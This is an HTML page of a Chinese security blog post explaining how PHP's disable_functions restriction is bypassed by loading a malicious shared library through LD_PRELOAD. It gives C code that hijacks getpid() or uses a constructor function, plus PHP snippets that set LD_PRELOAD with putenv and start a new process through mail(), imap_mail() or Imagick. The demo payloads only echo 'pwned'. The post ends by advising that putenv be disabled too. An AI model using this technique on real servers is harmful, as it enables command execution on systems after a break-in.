@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="利用LD_PRELOAD绕过disbale_functions">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - 利用LD_PRELOAD绕过disbale_functions 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    利用LD_PRELOAD绕过disbale_functions
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Tue Apr 2 2019 10:21:42 UTC">Apr 02, 2019</div>
+                    <div class="reading-time"><div class="middot"></div>1 minute read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
+
+<h3 id="0x01-背景">0x01 背景</h3>
+
+<p>有时候拿到<code>shell</code>后发现无法执行系统命令，通过<code>phpinfo</code>查看发现设置了<code>disbale_functions</code>，禁止了大部分可以执行命令的方法，这时候就要考虑绕过这个限制。本文是介绍了利用<code>LD_PRELOAD</code>环境变量加载恶意共享库的方式绕过，当然方式不止文中列出的几种，有何遗漏或不足欢迎提建议。</p>
+
+<h3 id="0x02-ld-preload-环境变量">0x02 LD_PRELOAD 环境变量</h3>
+
+<blockquote>
+<p><em>LD_PRELOAD</em> is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (<em>libc.so</em>) This is called preloading a library.</p>
+</blockquote>
+
+<p>根据文档介绍，如果使用<code>LD_PRELOAD</code>环境变量指定了一个共享库或共享对象，那么这个共享对象会在其他对象加载前被加载，例如</p>
+
+<pre><code class="language-shell">$ LD_PRELOAD=/path/to/my/malloc.so /bin/ls
+</code></pre>
+
+<p>即在执行<code>ls</code>命令前，会先加载指定路径的<code>malloc.so</code>文件，如果这是一个恶意共享对象，那么可以执行任意操作。</p>
+
+<p>我们可以通过<code>readelf</code>命令查看某个命令调用了哪些外部链接库，然后找到其中某个库，编写同名函数进行劫持，然后编译成共享对象文件，接着使用<code>LD_PRELOAD</code>环境变量指定生成的对象，达到命令执行的目的。</p>
+
+<p>一般情况我们选择简单的或者不带参数的命令，例如<code>id</code>，<code>ls</code>，<code>whoami</code>等，另外为了实现原型一致的劫持函数，也尽量选择常用的或者不用传递参数的函数，例如<code>getuid()</code>，<code>getpid()</code>，<code>getgid()</code>等</p>
+
+<p>以<code>python</code>为例，通过命令<code>readelf -s /usr/bin/python</code>列出<code>python</code>程序调用的系统函数，可以筛选出<code>get</code>型的函数</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111421.png" alt="" /></p>
+
+<p>尝试劫持<code>getpid()</code>函数</p>
+
+<p>首先通过man命令查看<code>getpid()</code>函数的实现</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402111816.png" alt="" /></p>
+
+<p>然后重写<code>getpid()</code>函数</p>
+
+<pre><code class="language-c">#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+pid_t getpid(void){
+    system(&quot;echo 'pwned by getpid!'&quot;);
+    return 0;
+}
+</code></pre>
+
+<p><strong>注意：</strong>因为通过设置<code>preload</code>劫持了比较底层的函数，而派发出的新进程如果用到该函数也会一并被劫持，也就是说如果没有及时<code>unsetenv(&quot;LD_PRELOAD&quot;)</code>则会导致不断循环，一旦操作敏感就会比较危险，所以一定要及时删除这个环境变量，改进版如下：</p>
+
+<pre><code class="language-c">#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+void payload(void){
+    system(&quot;echo 'pwned by getpid!'&quot;);
+}
+
+pid_t getpid(void){
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){
+        return 0;
+    }
+
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+
+    return 0;
+}
+</code></pre>
+
+<p>接着编译共享对象，<code>-shared</code>表示生成共享库，<code>-fPIC</code>表示使用地址无关代码</p>
+
+<pre><code class="language-shell">gcc -shared -fPIC getpid.c -o getpid.so
+</code></pre>
+
+<p><code>LD_PRELOAD</code>设置加载so文件，运行python，可以看到函数被成功劫持</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104653.png" alt="" /></p>
+
+<p>这个方法有一定限制，首先需要找到一个相对简单的函数原型，然后需要确保该函数被目标程序调用，因此一个更好的方法是利用扩展修饰符修饰函数，优先加载恶意函数，增强通用性，这里就用到了<code>扩展修饰符</code> <code>__attribute__((constructor))</code></p>
+
+<blockquote>
+<p>GCC 有个 C 语言扩展修饰符 <code>__attribute__((constructor))</code>，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 <code>__attribute__((constructor))</code> 修饰的函数</p>
+</blockquote>
+
+<p>简单说就是<code>__attribute__</code>可以修饰几个属性，包括函数属性、变量属性和类型属性，语法格式为：</p>
+
+<p><code>__attribute__(( attribute-list ))</code></p>
+
+<p>当函数属性被设置为<code>constructor</code>时，该函数会在可执行文件（或共享对象）加载时被调用，同理当设置属性为<code>destructor</code>时会在对象<code>unload</code>时调用，也就是说设置为这两个属性时，会在<code>main()</code>函数执行之前或者<code>return()</code>执行之后被调用，我们就可以借助这个扩展修饰符，当加载so文件时自动执行恶意函数，这样就不局限于某个特定函数，使用面大大扩展了</p>
+
+<p>重新写一个函数，使用 <code>__attribute__((constructor))</code>修饰</p>
+
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+
+void payload(void){
+    system(&quot;echo 'pwned!'&quot;);
+}
+
+__attribute__ ((__constructor__)) void exec(void){
+    if (getenv(&quot;LD_PRELOAD&quot;) == NULL){
+        return;
+    }
+
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    payload();
+
+    return;
+}
+</code></pre>
+
+<p>重新编译并加载，成功执行</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402154051.png" alt="" /></p>
+
+<h3 id="0x03-绕过-disable-functions">0x03 绕过<code>disable_functions</code></h3>
+
+<p>接下来看一下怎么利用<code>LD_PRELOAD</code>在<code>php</code>启用<code>disable_functions</code>禁用了命令/代码执行函数的情况下绕过这个限制，达到命令执行的效果</p>
+
+<p><code>php.ini</code>限制大部分执行命令的函数</p>
+
+<pre><code class="language-ini">disable_functions = assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open
+</code></pre>
+
+<p>根据上面的介绍，我们突破<code>disable_functions</code>的步骤如下</p>
+
+<ol>
+<li>编写恶意C函数，并编译成共享对象；</li>
+<li>在<code>php</code>执行过程中找到一个函数，这个函数能够产生一个新的进程；</li>
+<li>通过<code>putenv</code>设置<code>LD_PRELOAD</code>环境变量，使得新产生的进程优先加载恶意共享对象；</li>
+</ol>
+
+<p>第1步在上文已经解决了，第3步也比较容易实现，关键就是第2步，找到一个<code>php</code>中可以新起一个进程的函数，目的是为了让这个新进程使用的环境变量加载我们设置的恶意共享对象，达到劫持的目的</p>
+
+<p>在<code>php</code>中有这么几个函数可以被利用，<code>mail()</code>，<code>imap_mail()</code>，以及<code>Imagick</code>，来逐一测试</p>
+
+<h4 id="mail">mail()</h4>
+
+<p><code>mail()</code>函数会启动<code>sendmail</code>进程发送邮件，这个过程是可以被劫持的</p>
+
+<pre><code class="language-php">&lt;?php
+    mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;
+</code></pre>
+
+<p>通过<code>strace</code>查看<code>mail()</code>函数调用的过程</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190402180420.png" alt="" /></p>
+
+<p>可以看到除了<code>php</code>自身进程外还启动了<code>sendmail</code>进程，而<code>sendmail</code>在执行过程中调用了多个可以被劫持的函数，例如<code>getuid</code>，<code>getgid</code>， <code>getpid</code>等，我们还是以上面的<code>getpid</code>为例测试</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403103643.png" alt="" /></p>
+
+<p>通过<code>putenv</code>将<code>LD_PRELOAD</code>环境变量设置为上面编译好的<code>getpid.so</code></p>
+
+<pre><code class="language-php">&lt;?php
+    putenv(&quot;LD_PRELOAD=/tmp/getpid.so&quot;);
+    mail(&quot;admin@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);
+?&gt;
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403104908.png" alt="" /></p>
+
+<p>成功绕过<code>disable_functions</code>限制。另外也可以用<code>__attribute__ ((__constructor__))</code>修饰函数，这样就不局限于某个系统函数。</p>
+
+<h4 id="imap-mail">imap_mail()</h4>
+
+<p><code>imap_mail()</code>函数与<code>mail()</code>函数类似，都会调用<code>sendmail</code>程序发送邮件，因此也能通过<code>LD_PRELOAD</code>环境变量绕过，方法同上</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403141357.png" alt="" /></p>
+
+<h4 id="imagick">Imagick</h4>
+
+<p><code>Imagick</code>作为使用广泛的图形处理库，它在处理各种类型的文件时会调用不同的处理程序，这个过程也是可以进行劫持的，常见的文件类型与处理程序对应关系列举如下</p>
+
+<table>
+<thead>
+<tr>
+<th>文件类型</th>
+<th>调用程序</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>EPI/EPS/PDF/PS</td>
+<td><a href="http://www.cs.wisc.edu/~ghost">Ghostscript</a></td>
+</tr>
+
+<tr>
+<td>MNG/M2V</td>
+<td><a href="http://www.ffmpeg.org/download.html">ffmpeg</a></td>
+</tr>
+
+<tr>
+<td>JXR</td>
+<td><a href="https://jxrlib.codeplex.com/">jxrlib</a></td>
+</tr>
+</tbody>
+</table>
+
+<p>详细的依赖调用关系可以参考<a href="https://imagemagick.org/script/formats.php">官方网站</a></p>
+
+<p>以<code>eps</code>文件为例，使用<code>Imagick</code>加载</p>
+
+<pre><code class="language-php">&lt;?php
+    $a = new Imagick(&quot;/tmp/payload.eps&quot;);
+?&gt;
+</code></pre>
+
+<p>如果出现报错</p>
+
+<p><code>Uncaught ImagickException: not authorized 'payload.eps'</code></p>
+
+<p>需要修改<code>imagick</code>的<code>policy.xml</code>文件，把相应文件类型的权限修改为<code>read|write</code></p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403151458.png" alt="" /></p>
+
+<p>通过<code>strace</code>可以看到启动了<code>gs</code>程序处理</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403152424.png" alt="" /></p>
+
+<p>因此我们同样可以通过修改<code>LD_PRELOAD</code>达到执行代码的目的，而实际上这个过程并不要求<code>payload.eps</code>是个合法的<code>eps</code>文件</p>
+
+<p><img src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/images/20190403153255.png" alt="" /></p>
+
+<p>类似的，<code>pdf</code>、<code>ps</code>、<code>wmv</code>文件等，都可以通过这个方法利用。</p>
+
+<h3 id="0x04-总结">0x04 总结</h3>
+
+<p>本文主要介绍了如何利用<code>LD_PRELOAD</code>突破<code>disbale_functions</code>，当然这个方法也有一个限制，那就是<code>putenv</code>没有被禁用，得以设置环境变量，因此在不影响系统运行的前提下也需要把<code>putenv</code>加上。</p>
+
+<p>参考：</p>
+
+<p><a href="https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ">https://www.one-tab.com/page/sF_C-HRZTTGu-K_bDaSLoQ</a></p>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions\/';
+    var disqus_title = '利用LD_PRELOAD绕过disbale_functions';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/%E5%88%A9%E7%94%A8ld_preload%E7%BB%95%E8%BF%87disbale_functions\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2019 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
